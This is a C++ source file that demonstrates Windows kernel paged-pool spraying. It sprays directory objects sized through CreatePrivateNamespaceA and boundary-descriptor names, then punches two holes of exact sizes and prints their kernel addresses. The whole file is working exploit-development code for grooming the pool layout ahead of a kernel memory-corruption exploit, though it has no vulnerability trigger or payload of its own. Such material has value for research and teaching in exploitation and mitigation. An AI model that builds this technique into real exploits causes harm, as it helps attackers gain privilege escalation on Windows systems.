#include <Windows.h>
#include <SubAuth.h>
#include <stdio.h>
#include <time.h>
#include <exception>
#include "..\PoolSprayerLib\PoolSprayer.h"


HANDLE AllocatorPagedPool()
{
	HANDLE name = INVALID_HANDLE_VALUE;

	char rand_name[11];
	char rand_name2[11];
	int i = 0;

	for (i = 0; i < 10; i++)
	{
		rand_name[i] = 32 + (rand() % 50);
		rand_name2[i] = 33 + (rand() % 50);
	}
	rand_name[i] = 0;
	rand_name2[i] = 0;

	/*
		Note: The function CreatePrivateNamespace is very interesting.
		It creates a directory object ; you can control the size of the directory object
		because the name of the BoundaryDescriptor is stored directly in the PagedPool...
		So the size of the chunk change, making this object a great choice for spraying !
	*/
	
	name = CreatePrivateNamespaceA(NULL, CreateBoundaryDescriptorA(rand_name, 0) , rand_name2);
	if (name == INVALID_HANDLE_VALUE)
	{
		throw PoolSprayerException("Could'nt open namespace...\n");
	}
	return name;
}

int main(void)
{
	PagedPoolSprayer *pPoolSprayer;
	HOLE			FirstHole;
	HOLE			SecondHole;

	try
	{
		pPoolSprayer = new PagedPoolSprayer(0x220, DEFAULT_MAX_OBJECTS / 2, &AllocatorPagedPool);

		// Allocate massively the object
		printf("[+]Spraying Pool...\n");
		pPoolSprayer->sprayPool();

		// searching for a valid hole. The size of the equal will be equal to 2 * 0x220 = 0x440
		printf("[+]Planning first hole...\n");
		FirstHole = pPoolSprayer->planHole(2);

		// size: 3 * 0x220 = 0x660 !
		printf("[+]Planning second hole...\n");
		SecondHole = pPoolSprayer->planHole(3);

		printf("[+]First hole is precisely at address 0x%p\n", FirstHole.pBaseAddress);
		printf("[+]Second hole is precisely at address 0x%p\n", SecondHole.pBaseAddress);

		printf("[+]Creating Holes...\n");

		// The holes are created now.. Use them fast before something else does !
		pPoolSprayer->createHole(FirstHole);
		pPoolSprayer->createHole(SecondHole);

		printf("[+]Holes created ! You can check if you want...\n Press any key to continue...\n");
		getc(stdin);

		printf("[+]Freeing chunks...\n");
		pPoolSprayer->freePool();
	}
	catch (PoolSprayerException &e)
	{
		printf("[-]Error occured ! %s\n", e.getMessage());
		exit(1);
	}
}
